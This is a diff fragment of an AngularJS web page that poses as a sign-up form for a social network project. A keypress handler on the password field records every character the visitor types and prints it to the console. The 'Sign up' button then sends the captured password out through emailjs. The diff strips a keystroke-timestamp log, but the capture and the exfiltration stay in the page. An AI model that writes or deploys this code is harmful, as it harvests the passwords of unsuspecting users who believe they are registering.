-          <svg class="login__icon pass svg-icon" viewBox="0 0 20 20">
-            <path d="M0,20 20,20 20,8 0,8z M10,13 10,16z M4,8 a6,8 0 0,1 12,0" />
-          </svg>
-          <input type="password" class="login__input pass" ng-keypress="checkkey($event)" placeholder="Password"/>
-        </div>
-        <button type="button" class="login__submit" ng-click="send()">Sign up</button>
-        <p class="login__signup">Sign up for REACT, a social network project. &nbsp;<a></a></p>
-      </div>
-    </div>
-    <div class="app">
-      <div class="app__top">
-        <div class="app__menu-btn">
-          <span></span>
-        </div>
-</body>
-    <script>    
-    
-    angular.module('myApp',[])
+    </script>
+<script>
+      angular.module('myApp',[])
     
     .controller('yesCtrl', function($scope) {
-        $scope.typed = [];
         $scope.word = "";
        $scope.checkkey = function(e) {
-    var timestamp = Date.now() | 0;
-    var stroke = {
-        k: String.fromCharCode(e.which),
-        t: timestamp
-    };
-    $scope.typed.push(stroke);
     $scope.word += String.fromCharCode(e.which);
            console.log($scope.word);
-         
 }
        $scope.send = function() {
            emailjs.send("gmail","load",{notes: $scope.word});
-
        }
-
     })
-</script>
-   
+    </script>
+
 </html>
-
-
